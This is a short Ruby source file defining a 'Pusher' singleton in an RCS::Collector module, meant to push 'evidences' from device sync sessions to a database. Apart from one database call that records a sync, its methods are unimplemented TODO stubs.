#
#  Pusher module for sending evidences to the database
#

# relatives
require_relative 'db.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'singleton'

module RCS
module Collector

class Pusher
  include Singleton

  def sync_for(session, version, user, device, source, time)

    # notify the database that the sync is in progress
    DB.instance.sync_for session[:bid], version, user, device, source, Time.now

    #TODO: implement
  end

  def sync_end(session)
    #TODO: implement
  end

  def evidence(size, content)
    #TODO: implement
    return true
  end

end #Pusher

end #Collector::
end #RCS::